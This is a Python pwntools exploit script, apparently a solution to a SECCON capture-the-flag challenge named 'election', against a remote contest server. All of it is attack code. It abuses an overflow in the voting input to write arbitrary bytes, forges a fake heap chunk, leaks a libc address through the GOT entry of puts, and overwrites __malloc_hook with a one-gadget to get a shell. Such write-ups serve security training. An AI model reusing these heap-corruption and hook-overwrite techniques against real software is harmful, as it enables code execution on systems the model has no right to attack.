from pwn import *

#r = process('./election')
r = remote('election.pwn.seccon.jp', 28349)
e = ELF('./election')
libc = e.libc
context.arch = 'amd64'

status = 0x0000000000602010
ojima = 0x0000000000401004
l = 0x0000000000602028

def add(name):
    r.sendafter('>> ', '1')
    r.sendafter('>> ', name)
def vote(addr, num):
    r.sendafter('>> ', '2')
    r.sendafter('Show candidates? (Y/n) ', 'n')
    r.sendafter('>> ', 'oshima')
    r.sendafter('>> ', 'yes\x00AAAA'+'A'*0x18+p64(addr)+p64(num)[0])

def forge(addr, num):
    for i in range(8):
        vote(addr-0x10+i, num&0xff)
        if num&0xff > 0x7f:
            vote(addr-0x10+i+1, 1)
        num >>= 8

# create two pointers in heap
add(p64(e.got['puts'])[:3]+'\xff'*5+p64(l-1))
r.sendafter('>> ', '2')
r.sendafter('Show candidates? (Y/n) ', 'n')
r.sendafter('>> ', 'oshima')
r.sendafter('>> ', 'yes\x00AAAA'+'A'*0x18+chr(0xe3))
#r.sendafter('>> ', 'yes\x00AAAA'+'A'*0x18+chr(0xe3)+'\x30\x60\x00\x00')
r.sendafter('>> ', '2')
r.sendafter('Show candidates? (Y/n) ', 'n')
r.sendafter('>> ', 'oshima')
r.sendafter('>> ', 'yes\x00AAAA'+'A'*0x18+chr(0xe7))
#r.sendafter('>> ', 'yes\x00AAAA'+'A'*0x18+chr(0xe7)+'\x30\x60\x00\x00')

# create a fake chunk in bss
forge(0x602030, 0x602038)
forge(0x602038, ojima)

# pivot chunks
vote(l-0x10, 0x20)

# leak libc
r.sendafter('>> ', '2')
r.sendafter('Show candidates? (Y/n) ', 'y')
r.recvuntil('Candidates:\n* ')
puts = u64(r.recv(6)+'\x00\x00')
libc_base = puts - libc.symbols['puts']
log.info('libc base: %#x' % libc_base)
r.sendafter('>> ', p64(puts))

# modify __malloc__hook
__malloc_hook = libc_base + libc.symbols['__malloc_hook']
magic = libc_base + 0xf0274
print hex(magic)
forge(__malloc_hook, magic)
vote(__malloc_hook-0x10+5, 0xff)
# reset lv
vote(status-0x10, 0xff)

raw_input('>>')
# trigger
add('AA')


r.interactive()
